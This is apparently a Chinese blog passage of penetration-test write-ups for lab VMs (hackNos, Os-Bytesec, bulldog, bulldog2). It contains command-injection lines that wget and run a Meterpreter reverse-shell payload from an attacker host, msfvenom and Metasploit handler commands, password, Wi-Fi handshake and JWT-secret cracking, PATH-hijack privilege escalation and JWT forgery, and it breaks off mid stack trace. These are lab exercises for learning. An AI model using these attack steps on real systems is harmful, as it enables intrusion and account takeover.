去掉shell.php中开头的/* 开启python的http服务 python -m SimpleHTTPServer 8000 在网页中执行wget 127.0.0.1|wget http://192.168.31.10:8000/shell.php 在MSF中接收Meterpreter 12345use exploit&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 2020run 再访问shell.php即可 权限提升 在Meterpreter的shell中获取TTY 12shellpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 在passwd文件中发现可用账户recon 一番尝试后发现账户密码同Basic认证的密码 123456su reconSecurity@hackNossudo suSecurity@hackNosid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 如何找到靶机的IP? 这个问题曾经让我头疼过一阵子 看着网上的WP，有些是使用netdiscover，但是个人倾向于将靶机与Kali的网络配置成桥接模式，即使netdiscover发现了靶机，也没有一个明显地特征可以在当前网段的众多机器中去区分 个人的话倒是会去看路由器的后台，然后看看本机上的多个IP 而Nmap在扫描靶机时，可以报告其MAC地址与相关厂商，而一般的靶机都会在80端口开放WEB服务，那么就可以扫描80端口，再配合上grep来节选出靶机 nmap -p 80 -Pn -v -T5 192.168.31.0/24 | grep -B 6 virtual Web log 在尝试命令执行的时候我也尝试了使用curl命令来进行数据外传，但是发现自己找不到Web服务的log文件，只好用find命令配合grep找，中间也稍微学习了一下grep的正则用法 find /* -iname &quot;*.log&quot; | grep -E &quot;(apache|nginx)&quot; 大概是这个样子 参考资料 FTP WP grep&amp;RE Os-Bytesec 2020/02/15 16:50:01 端口扫描 nmap -p- -Pn -sV -n -T5 -v -A 192.168.31.185 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657Nmap scan report for 192.168.31.185Host is up (0.0012s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8| http-methods: |_ Supported Methods: OPTIONS GET HEAD POST|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Hacker_James139&#x2F;tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445&#x2F;tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2525&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)| 256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)|_ 256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)MAC Address: 08:00:27:55:0A:C2 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.281 days (since Fri Feb 14 21:05:09 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;264 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: NITIN; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelHost script results:|_clock-skew: mean: -18h25m11s, deviation: 3h10m31s, median: -16h35m11s| nbstat: NetBIOS name: NITIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| Names:| NITIN&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;| NITIN&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;| NITIN&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;| \\x01\\x02__MSBROWSE__\\x02&lt;01&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;1d&gt; Flags: &lt;unique&gt;&lt;active&gt;|_ WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: nitin| NetBIOS computer name: NITIN\\x00| Domain name: 168.1.7| FQDN: nitin.168.1.7|_ System time: 2020-02-14T21:43:57+05:30| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2020-02-14 11:13:57|_ start_date: N&#x2F;A Web路径枚举 dirb http://192.168.31.185/ -w 123456789---- Scanning URL: http:&#x2F;&#x2F;192.168.31.185&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;css&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;gallery&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;html&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;img&#x2F; + http:&#x2F;&#x2F;192.168.31.185&#x2F;index.html (CODE:200|SIZE:3086) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;js&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;news&#x2F; + http:&#x2F;&#x2F;192.168.31.185&#x2F;server-status (CODE:403|SIZE:279) 在index.html页面的底端获取一段字符串 ####################GET#####smb##############free 在图片/img/news.png中获取信息BlueKeep Attacks BlueKeep是Windows上RDP服务上的漏洞(CVE-2019-0708)，目测与本靶机关联并不大。 漏洞利用 enum4linux 192.168.31.185 123S-1-22-1-1000 Unix User\\sagar (Local User)S-1-22-1-1001 Unix User\\blackjax (Local User)S-1-22-1-1002 Unix User\\smb (Local User) 获得三个账户名 使用smbmap进行测试 12345678smbmap -H 192.168.31.185[+] Finding open SMB ports....[+] Guest SMB session established on 192.168.31.185...[+] IP: 192.168.31.185:445 Name: 192.168.31.185 Disk Permissions ---- ----------- print$ NO ACCESS IPC$ NO ACCESS 12345678smbmap -H 192.168.31.185 -u smb[+] Finding open SMB ports....[+] User SMB session establishd on 192.168.31.185...[+] IP: 192.168.31.185:445 Name: 192.168.31.185 Disk Permissions ---- ----------- print$ READ ONLY IPC$ NO ACCESS 账户smb可以登入SMB服务 使用hydra爆破SMB服务中SMB账户的密码 12345hydra -I -l smb -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -e n smb:&#x2F;&#x2F;192.168.31.185[DATA] attacking smb:&#x2F;&#x2F;192.168.31.185:445&#x2F;[445][smb] host: 192.168.31.185 login: smb1 of 1 target successfully completed, 1 valid password found 密码为空 登入SMB服务 123456789smbclient &#x2F;&#x2F;192.168.31.185&#x2F;smb -U smbls . D 0 Mon Nov 4 06:50:37 2019 .. D 0 Mon Nov 4 06:37:28 2019 main.txt N 10 Mon Nov 4 06:45:38 2019 safe.zip N 3424907 Mon Nov 4 06:50:37 2019 9204224 blocks of size 1024. 6824568 blocks available 下载文件 12get main.txtget safe.zip main.txt中没有有效信息 safe.zip被加密 使用fcrackzip进行爆破 123fcrackzip -u -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt safe.zip PASSWORD FOUND!!!!: pw &#x3D;&#x3D; hacker1 解压压缩包 12unzip safe.ziphacker1 得到两个文件 secret.jpg 有文字–“AFTER THE WALKOUT”，暂时不考虑图片隐写等其他因素 user.cap WireShare打开之后是IEEE 802.11协议(WIFI)的流量包，可能存在握手包 1234567891011121314151617181920212223242526272829303132333435aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt user.capOpening user.cap please wait...Read 49683 packets. # BSSID ESSID Encryption 1 56:DC:1D:19:52:BC blackjax WPA (1 handshake)Choosing first network as target.Opening user.cap please wait...Read 49683 packets.1 potential targets Aircrack-ng 1.5.2 [00:00:07] 21280&#x2F;7120712 keys tested (2885.36 k&#x2F;s) Time left: 41 minutes, 0 seconds 0.30% KEY FOUND! [ snowflake ] Master Key : 80 0A BE 28 5A 50 78 10 7E E2 85 A8 E8 D0 41 3C 5E CB 18 C2 40 05 D7 7F E1 12 E6 B4 C6 D8 F4 E5 Transient Key : C8 9D B1 E2 76 82 F3 90 AC 53 CB 02 8F D0 73 FB 47 92 63 63 56 97 1C 19 36 BD FD B4 D5 6D 65 35 48 1B D3 06 57 40 4D 77 9D BD 26 30 1B B3 06 AF 1B FA 37 7E E8 9C 17 07 BE 63 DD C0 11 D4 88 21 EAPOL HMAC : 68 98 0E 18 F9 DA 55 3B 4B BC EA 35 37 CC 25 2F SSID为blackjax，密码为snowflake 在WireShark中调试 Preference -&gt; Protocols -&gt; IEEE 802.11-&gt; Decryption keys -&gt; Edit 添加Key记录 wpa-pwd|snowflake:blackjax 流量包中未找到其他有效信息 尝试枚举SSH账户 123echo -e &quot;smb\\nblackjax\\nsagar\\nroot\\nadmin\\nhelo\\nsnowflake&quot; &gt; testhydra -I -L test -P test -e ns -u ssh:&#x2F;&#x2F;192.168.31.185 -s 2525 [2525][ssh] host: 192.168.31.185 login: blackjax password: snowflake 获取账户blackjax 权限提升 登入SSH服务 123ssh blackjax@192.168.31.185 -p 2525snowflake&#x2F;bin&#x2F;bash 尝试SUID提权 12345678910111213141516171819202122232425find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device&#x2F;usr&#x2F;bin&#x2F;newgidmap&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;newuidmap&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;chsh&#x2F;usr&#x2F;bin&#x2F;pkexec&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;netscan&#x2F;usr&#x2F;bin&#x2F;sudo&#x2F;bin&#x2F;ping6&#x2F;bin&#x2F;fusermount&#x2F;bin&#x2F;mount&#x2F;bin&#x2F;su&#x2F;bin&#x2F;ping&#x2F;bin&#x2F;umount&#x2F;bin&#x2F;ntfs-3g /usr/bin/netscan有些异常 使用strings命令分析 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182strings &#x2F;usr&#x2F;bin&#x2F;netscan &#x2F;lib&#x2F;ld-linux.so.2libc.so.6_IO_stdin_usedsetuidsystemsetgid__libc_start_main__gmon_start__GLIBC_2.0PTRhQVhkUWVSt$,U[^_]netstat -antp;*2$&quot;(GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.7209__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrypingshell.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bx_edata__data_startsetgid@@GLIBC_2.0system@@GLIBC_2.0__gmon_start____dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0__libc_csu_init_fp_hw__bss_startmainsetuid@@GLIBC_2.0_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment 可以看到netstat -antp 猜想这个二进制文件是在执行netstat命令 则可以进行PATH提权 123456789cd &#x2F;tmpecho &quot;&#x2F;bin&#x2F;bash&quot; &gt;netstatchmod 777 netstatecho $PATHexport PATH&#x3D;&#x2F;tmp:$PATHcd &#x2F;usr&#x2F;bin.&#x2F;netscanid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1001(blackjax) PATH提权 目标文件为二进制可执行文件 需要知道目标文件所执行的命令 strings查看可执行文件内容 参考资料 WP WP SMB PATH提权 bulldog 2020/02/17 19:06:44 端口扫描 nmap -p 1-65535 -sV -T5 -n -v -A 192.168.31.121 1234567891011121314151617181920212223242526272829Nmap scan report for 192.168.31.121Host is up (0.0011s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION23&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)| 256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)|_ 256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)80&#x2F;tcp open http WSGIServer 0.1 (Python 2.7.12)| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12|_http-title: Bulldog Industries8080&#x2F;tcp open http WSGIServer 0.1 (Python 2.7.12)| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12|_http-title: Bulldog IndustriesMAC Address: 08:00:27:33:65:D8 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.003 days (since Sun Feb 16 21:45:10 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;257 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 尝试爆破80端口下的Web路径 dirb http://192.168.31.121/ 123456---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;admin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F; + http:&#x2F;&#x2F;192.168.31.121&#x2F;robots.txt (CODE:200|SIZE:1071)---- Entering directory: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;shell&#x2F; ---- 尝试爆破8080端口下的Web路径 12345678dirb http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;admin&#x2F;&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;+ http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;robots.txt (CODE:200|SIZE:1071) ---- Entering directory: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;shell&#x2F; ---- 80端口与8080端口上的WEB服务的路径几乎一样，极可能是同一个站点。 访问两个WEB服务之后发现并无差别，先对80端口进行渗透。 漏洞利用 访问路径/admin/跳转至登录界面 简单尝试弱口令后无效 访问路径/dev/shell/时提示 &quot;Please authenticate with the server to use Web-Shell&quot; 猜测需要在之前的登录界面中登入后才能访问 访问路径/dev/与/时发现一些人名 制作简易字典 123456789101112131415161718192021222324252627282930313233343536373839cat dicWinston ChurchyBulldog IndustriesAlan Brookealan@bulldogindustries.comwilliam@bulldogindustries.commalik@bulldogindustries.comkevin@bulldogindustries.comashley@bulldogindustries.comnick@bulldogindustries.comsarah@bulldogindustries.comadmin@bulldogindustries.comadminrootSarahsarahNicknickAshleyashleyKevinkevinMalikmalikWilliamwilliamAlanalanBrookebrookeBulldogbulldogIndustriesindustriesWinstonwinstonChurchychurchy 使用burpsuite进行账户爆破 得到账户nick:bulldog 登入之后得到提示You don't have permission to edit anything. 此时再访问/dev/shell/ WEB端执行系统命令 -&gt; 命令注入 简单尝试之后发现ls|cat /etc/passwd可以执行 但是这个WEB是基于python的Django架构，不存在写入一句话木马的方法。 大概有两种方法： nc连接(正向连接/反弹Shell) wget下载后门程序 第一种方法 直接返回500 pass 第二种方法 生成后门文件&amp;启动HTTP服务 12msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 &gt; shell.pypython -m SimpleHTTPServer 80 &amp; MSF 12345use exploit&#x2F;multi&#x2F;handlerset payload python&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 2020run 命令注入 12ls|wget http:&#x2F;&#x2F;192.168.31.10&#x2F;shell.pyls|python shell.py 在MSF中接收到Shell 权限提升 获取tty 12shellpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 在路径/home/bulldogadmin/下发现隐藏路径.hiddenadmindirectory 进入之后发现两个文件note，customPermissionApp 先将两个文件复制至自己home目录下并更改权限 12cp * &#x2F;home&#x2F;django&#x2F;chmod 700 note customPermissionApp 1234567891011cat note Nick,I&#39;m working on the backend permission stuff. Listen, it&#39;s super prototype but I think it&#39;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! It&#39;s great stuff! Once I&#39;m finished with it, a hacker wouldn&#39;t even be able to reverse it! Keep in mind that it&#39;s still a prototype right now. I am about to get it working with the Django user account. I&#39;m not sure how I&#39;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?Let me know what you think of it!-Ashley 另外一个文件是elf文件，大概对于提权有帮助 直接执行则提示需要输入自己的密码，大概在执行sudo su 用strings命令分析一下内容 看到一串有意思的字符 1234SUPERultHimatePASHSWORDyouHCANTget 可以猜测密码是SUPERultHimatePASHSWORDyouHCANTget 或SUPERultimatePASSWORDyouCANTget 1234sudo suSUPERultimatePASSWORDyouCANTgetid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 参考资料 Burp.Intruder bulldog2 2020/02/20 16:35:33 端口扫描 nmap -sV -p 1-65535 -T 5 -n -A -v 192.168.31.233 12345678910111213141516171819202122Nmap scan report for 192.168.31.233Host is up (0.0012s latency).Not shown: 65534 filtered portsPORT STATE SERVICE VERSION80&#x2F;tcp open http nginx 1.14.0 (Ubuntu)|_http-cors: HEAD GET POST PUT DELETE PATCH|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx&#x2F;1.14.0 (Ubuntu)|_http-title: Bulldog.socialMAC Address: 08:00:27:FE:62:D8 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9Uptime guess: 43.190 days (since Tue Jan 7 22:59:12 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;253 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 尝试爆破80端口下的Web路径 dirb http://192.168.31.233/ -w 123---- Scanning URL: http:&#x2F;&#x2F;192.168.31.233&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.233&#x2F;assets (CODE:301|SIZE:179) + http:&#x2F;&#x2F;192.168.31.233&#x2F;favicon.ico (CODE:200|SIZE:5430) dirb扫描路径时没有发现有价值的信息 手工登录网页时发现路径/login，/register，/about 路径/下有一些用户评论 路径/login下存在登录点 路径/register提示无法注册 漏洞利用 账户爆破 构造字典 12345678910111213141516171819202122232425262728293031323334cat dicBulldogbulldogSocialsocialJohnathan AbbeyJohnathanjohnathanAbbeyabbeySarah DubreeSarahsarahDubreedubreeWilliam KatzWilliamwilliamKatzkatzWinston ChurchyWinstonwinstonChurchychurchyBulldog IndustriesIndustriesindustriesnetworkadminroot123456a123456 使用burpsuite进行爆破，失败 账户注册 审计js文件，搜索&quot;register&quot; 发现两处与上传有关的函数 1234567891011121314151617181920return l.prototype.registerUser &#x3D; function(l) &#123; var n &#x3D; new x.Headers; return n.append(&quot;Content-Type&quot;, &quot;application&#x2F;json&quot;), this.http.post(&quot;&#x2F;users&#x2F;register&quot;, l, &#123; headers: n &#125;).map(function(l) &#123; return l.json() &#125;) &#125;,-----------------l.prototype.onRegisterSubmit &#x3D; function() &#123;var l &#x3D; this,n &#x3D; &#123; name: this.name, email: this.email, username: this.username, password: this.password&#125;; 猜测可以以POST方式请求路径/users/register，并附带相应格式的json数据即可完成注册 在burp中构造请求 12345678910111213141516POST &#x2F;users&#x2F;register HTTP&#x2F;1.1Host: 192.168.31.233User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Accept-Language: en-US,en;q&#x3D;0.5Accept-Encoding: gzip, deflatecontent-type: application&#x2F;jsonContent-Length: 84Connection: close&#123;&quot;name&quot;: &quot;abc&quot;,&quot;email&quot;: &quot;abc@abc.abc&quot;,&quot;username&quot;: &quot;abc&quot;,&quot;password&quot;: &quot;abc&quot;&#125; 得到响应 1234567891011HTTP&#x2F;1.1 200 OKServer: nginx&#x2F;1.14.0 (Ubuntu)Date: Thu, 20 Feb 2020 09:32:26 GMTContent-Type: application&#x2F;json; charset&#x3D;utf-8Content-Length: 40Connection: closeX-Powered-By: ExpressAccess-Control-Allow-Origin: *ETag: W&#x2F;&quot;28-r22PRevV1bosgiTQ0L7&#x2F;zW61meQ&quot;&#123;&quot;success&quot;:true,&quot;msg&quot;:&quot;User registered&quot;&#125; 使用账户abc:abc成功登入 登入之后发现自己不能执行任何功能，开始垂直提权 垂直提权 在登入时发现一次http交互中带有一段json 1234567891011&#123; &quot;success&quot;:true, &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg&quot;, &quot;user&quot;: &#123; &quot;name&quot;:&quot;abc&quot;, &quot;username&quot;:&quot;abc&quot;, &quot;email&quot;:&quot;abc@abc.abc&quot;, &quot;auth_level&quot;:&quot;standard_user&quot; &#125;&#125; 解析JWT得到如下内容 12&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;standard_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125; 再审计js，查找&quot;auth_level&quot; 12345l.prototype.isAdmin&#x3D;function()&#123; var l&#x3D;localStorage.getItem(&quot;user&quot;); return null!&#x3D;&#x3D;l &amp;&amp; &quot;master_admin_user&quot;&#x3D;&#x3D;JSON.parse(l).auth_level&#125; 发现&quot;master_admin_user&quot; 可以尝试修改JWT来尝试提权 尝试爆破JWT秘钥 1234git clone https:&#x2F;&#x2F;github.com&#x2F;brendan-rius&#x2F;c-jwt-crackercd c-jwt-crackerchmod +x jwtcrack.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg abcdefghijklmnopqrstuvwxyz 6 得到秘钥为&quot;secret&quot; 修改JWT数据内容 12&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125; 伪造JWT 12345pip install pyjwtpythonimport jwtjwt.encode(&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;, &#39;secret&#39;, algorithm&#x3D;&#39;HS256&#39;) &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&#39; 在burp中开启拦截HTTP响应，登出账户并登入，用如下的数据代替身份校验步骤的JWT数据 1234567891011&#123; &quot;success&quot;:true, &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&quot;, &quot;user&quot;: &#123; &quot;name&quot;:&quot;abc&quot;, &quot;username&quot;:&quot;abc&quot;, &quot;email&quot;:&quot;abc@abc.abc&quot;, &quot;auth_level&quot;:&quot;master_admin_user&quot; &#125;&#125; 获得admin权限 在dashboard发现一个Link+登入点 尝试爆破，失败 报错信息 访问路径/%aa 获得报错信息 1234567891011121314151617URIError: Failed to decode param &#39;&#x2F;%aa&#39; at decodeURIComponent (&lt;anonymous&gt;) at decode_param (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12) at Layer.match (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:123:27) at matchLayer (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18) at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15) at SessionStrategy.strategy.pass (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:338:9) at SessionStrategy.authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;strategies&#x2F;session.js:75:10) at attempt (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:361:16) at authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:362:7) at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at trim_prefix (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13) at 